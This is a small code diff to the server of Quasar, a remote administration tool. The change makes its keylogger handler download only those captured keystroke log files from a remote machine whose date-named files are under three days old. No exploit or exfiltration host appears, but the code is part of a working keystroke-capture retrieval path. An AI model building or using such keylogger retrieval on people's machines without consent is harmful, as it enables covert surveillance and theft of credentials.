@@ -129,7 +129,10 @@ namespace Quasar.Server.Messages
                     return;
                 }
 
-                _fileManagerHandler.BeginDownloadFile(Path.Combine(_remoteKeyloggerDirectory, item.Name), item.Name + ".html", true);
+                DateTime d = DateTime.Parse(item.Name);
+                if (DateTime.Now.Subtract(d).TotalDays <3) {
+                    _fileManagerHandler.BeginDownloadFile(Path.Combine(_remoteKeyloggerDirectory, item.Name), item.Name + ".html", true);
+                }
             }
         }
 
